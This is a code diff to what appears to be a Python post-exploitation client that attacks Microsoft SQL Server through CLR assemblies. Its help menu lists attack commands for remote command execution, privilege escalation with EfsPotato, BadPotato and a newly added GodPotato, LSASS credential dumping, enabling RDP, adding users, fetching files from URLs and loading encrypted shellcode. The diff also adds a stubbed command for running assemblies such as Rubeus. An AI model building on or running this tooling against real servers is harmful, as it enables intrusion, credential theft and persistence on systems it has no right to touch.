@@ -75,15 +75,17 @@ if __name__ == '__main__':
     clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
     clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
     clr_badpotato {cmd}        - exec by BadPotato like clr_exec
+    clr_godpotato {cmd}        - exec by GodPotato like clr_exec
     clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
     clr_dumplsass {path}       - dumplsass by clr
     clr_rdp                    - check RDP port and Enable RDP
     clr_getav                  - get anti-virus software on this machin by clr
     clr_adduser {user} {pass}  - add user by clr
     clr_download {url} {path}  - download file from url by clr
-    clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
-    clr_scloader1 {file} {key} - Encrypt Shellcode by Encrypt.py and Upload Payload.txt
-    clr_scloader2 {remotefile} - Upload Payload.bin to target before Shellcode Loader
+    clr_scloader {code} {key}  - encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
+    clr_scloader1 {file} {key} - encrypt Shellcode by Encrypt.py and Upload Payload.txt
+    clr_scloader2 {remotefile} - upload Payload.bin to target before Shellcode Loader
+    clr_assembly {file} {args} - execute assembly by clr
     use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
     enum_db                    - enum databases
     enum_links                 - enum linked servers
@@ -129,6 +131,14 @@ if __name__ == '__main__':
                 return
             remote, local = input
             self.sql_op.file_doanload(remote, local)
+
+        def do_clr_assembly(self, line):
+            input = line.split(" ")
+            if len(input) < 1 or len(line) == 0 :
+                print("Example: clr_assembly /tmp/Rubeus.exe -h")
+                return
+            # TODO
+            # self.sql_op.execute_assembly(input)
 
         def do_install_clr(self, line):
             self.sql_op.install_clr()
@@ -180,6 +190,9 @@ if __name__ == '__main__':
 
         def do_clr_badpotato(self, line):
             self.sql_op.clr_exec("clr_badpotato "+ line) 
+        
+        def do_clr_godpotato(self, line):
+            self.sql_op.clr_exec("clr_godpotato "+ line) 
 
         def do_clr_scloader(self, line):
             self.sql_op.clr_exec("clr_scloader "+ line)    
